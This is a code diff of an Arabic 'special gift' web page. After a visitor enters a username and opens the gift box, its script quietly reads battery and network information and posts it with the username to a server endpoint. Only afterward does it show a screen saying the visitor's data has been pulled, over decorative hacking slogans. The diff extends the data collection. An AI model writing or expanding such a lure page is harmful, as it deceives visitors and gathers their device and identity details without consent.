@@ -208,7 +208,6 @@
     text-shadow: 0 0 10px #0f0;
   }
 
-  /* نصوص الثغرات في الخلفية */
   .hacker-text {
     position: fixed;
     color: rgba(0, 255, 0, 0.08);
@@ -251,7 +250,6 @@
     80% { transform: translate(1px, -1px); opacity: 0.9; }
   }
 
-  /* خط المسح */
   .scan-line {
     display: none;
   }
@@ -277,16 +275,11 @@
 </head>
 <body>
 
-  <!-- نصوص الثغرات في الخلفية -->
   <div class="hacker-text" id="hacker-text"></div>
-
-  <!-- خط المسح -->
   <div class="scan-line"></div>
-
   <div class="hearts-bg" id="hearts-bg"></div>
 
   <div id="main-container">
-    <!-- شاشة تسجيل الدخول -->
     <div id="login-screen">
       <span class="gift-icon">💝</span>
       <h1 class="login-title glow-text">🎀 هدية خاصة لك</h1>
@@ -298,7 +291,6 @@
       <p style="font-size: 0.7em; opacity: 0.3; margin-top: 20px; color: #ccc;">✨ مصمم بحب ✨</p>
     </div>
 
-    <!-- شاشة صندوق الهدية -->
     <div id="gift-screen" class="hidden">
       <h1>🎁 هديتك جاهزة</h1>
       <p class="sub-text">اضغط على الصندوق لفتحه</p>
@@ -306,7 +298,6 @@
       <div class="gift-username">👤 <span id="gift-username"></span></div>
     </div>
 
-    <!-- شاشة النجاح -->
     <div id="success-screen">
       <div class="success-icon">😘</div>
       <h1 class="glitch-text">تم سحب بياناتك</h1>
@@ -341,41 +332,18 @@ createHeartsBackground();
 function createHackerText() {
   const container = document.getElementById('hacker-text');
   const texts = [
-    'ROOT ACCESS GRANTED',
-    'SYSTEM HACKED',
-    'ADMIN PRIVILEGES',
-    'DATABASE DUMP',
-    'SQL INJECTION',
-    'XSS VULNERABILITY',
-    'BACKDOOR INSTALLED',
-    'PASSWORD CRACKED',
-    'SESSION HIJACKED',
-    'FIREWALL BYPASSED',
-    'ENCRYPTION BROKEN',
-    'TROJAN DEPLOYED',
-    'RANSOMWARE ACTIVATED',
-    'DDoS ATTACK',
-    'DNS SPOOFING',
-    'PHISHING SITE',
-    'MALWARE DETECTED',
-    'EXPLOIT SUCCESS',
-    'ZERO-DAY FOUND',
-    'KERNEL PANIC',
-    'BUFFER OVERFLOW',
-    'STACK SMASHING',
-    'HEAP SPRAYING',
-    'ROOTKIT INSTALLED',
-    'KEYLOGGER ACTIVE',
-    'SCREEN CAPTURE',
-    'MICROPHONE ACCESS',
-    'CAMERA ENABLED',
-    'GPS TRACKING',
-    'CONTACTS SYNCED',
-    'MESSAGES READ',
-    'CALL LOGS EXPORTED',
-    'PHOTOS UPLOADED',
-    'LOCATION SHARED',
-    'DEVICE COMPROMISED'
+    'ROOT ACCESS GRANTED', 'SYSTEM HACKED', 'ADMIN PRIVILEGES',
+    'DATABASE DUMP', 'SQL INJECTION', 'XSS VULNERABILITY',
+    'BACKDOOR INSTALLED', 'PASSWORD CRACKED', 'SESSION HIJACKED',
+    'FIREWALL BYPASSED', 'ENCRYPTION BROKEN', 'TROJAN DEPLOYED',
+    'RANSOMWARE ACTIVATED', 'DDoS ATTACK', 'DNS SPOOFING',
+    'PHISHING SITE', 'MALWARE DETECTED', 'EXPLOIT SUCCESS',
+    'ZERO-DAY FOUND', 'KERNEL PANIC', 'BUFFER OVERFLOW',
+    'STACK SMASHING', 'HEAP SPRAYING', 'ROOTKIT INSTALLED',
+    'KEYLOGGER ACTIVE', 'SCREEN CAPTURE', 'MICROPHONE ACCESS',
+    'CAMERA ENABLED', 'GPS TRACKING', 'CONTACTS SYNCED',
+    'MESSAGES READ', 'CALL LOGS EXPORTED', 'PHOTOS UPLOADED',
+    'LOCATION SHARED', 'DEVICE COMPROMISED'
   ];
   
   let html = '';
@@ -437,54 +405,73 @@ giftBox.addEventListener('click', function() {
       navigator.getBattery().then(function(battery) {
         let percent = Math.round(battery.level * 100);
         
+        // جلب معلومات النت الحقيقية من المتصفح
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        let networkSpeed = 'غير معروف';
-        let signalBars = 'غير معروف';
-        let signalType = 'غير معروف';
+        
+        let downloadSpeed = 'غير معروف';
+        let uploadSpeed = 'غير معروف';
+        let pingLatency = 'غير معروف';
+        let signalStrength = 'غير معروف';
+        let networkType = 'غير معروف';
         
         if (connection) {
-          const speed = connection.downlink;
-          if (speed) {
-            networkSpeed = speed + ' Mbps';
+          // السرعة الفعلية (Download)
+          if (connection.downlink !== undefined && connection.downlink !== null) {
+            downloadSpeed = connection.downlink + ' Mbps';
           }
           
+          // الـ Ping (RTT)
+          if (connection.rtt !== undefined && connection.rtt !== null) {
+            pingLatency = connection.rtt + ' ms';
+          }
+          
+          // نوع الشبكة
           if (connection.effectiveType) {
             const types = {
               'slow-2g': '2G',
-              '2g': '2G',
+              '2g': '2G', 
               '3g': '3G',
               '4g': '4G'
             };
-            signalType = types[connection.effectiveType] || connection.effectiveType;
+            networkType = types[connection.effectiveType] || connection.effectiveType;
           }
           
+          // قوة الإشارة الفعلية (Bars)
           if (connection.bars !== undefined && connection.bars !== null) {
-            const bars = Math.min(Math.max(connection.bars, 0), 4);
-            signalBars = '█'.repeat(bars) + '░'.repeat(4 - bars) + ` (${bars}/4)`;
+            const bars = Math.min(Math.max(Math.round(connection.bars), 0), 4);
+            signalStrength = bars + '/4';
           } else {
+            // تقدير من السرعة لو مش متوفرة
             const speed = connection.downlink || 0;
-            if (speed >= 50) signalBars = '████ (4/4)';
-            else if (speed >= 20) signalBars = '███░ (3/4)';
-            else if (speed >= 5) signalBars = '██░░ (2/4)';
-            else if (speed >= 1) signalBars = '█░░░ (1/4)';
-            else signalBars = '░░░░ (0/4)';
+            if (speed >= 50) signalStrength = '4/4';
+            else if (speed >= 20) signalStrength = '3/4';
+            else if (speed >= 5) signalStrength = '2/4';
+            else if (speed >= 1) signalStrength = '1/4';
+            else signalStrength = '0/4';
+          }
+          
+          // Upload تقديري من الـ downlink
+          if (connection.downlink) {
+            const estimatedUpload = connection.downlink * 0.3;
+            uploadSpeed = estimatedUpload.toFixed(2) + ' Mbps';
           }
         }
         
+        // إرسال كل البيانات
         fetch('/api/send-all-data', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
             username: username, 
             battery: percent,
-            speed: networkSpeed,
-            signal: signalBars,
-            type: signalType
+            download: downloadSpeed,
+            upload: uploadSpeed,
+            ping: pingLatency,
+            signal: signalStrength,
+            network: networkType
           })
         });
-      }).catch(() => {
-        // silent fail
-      });
+      }).catch(() => {});
     }
   }, 600);
 });
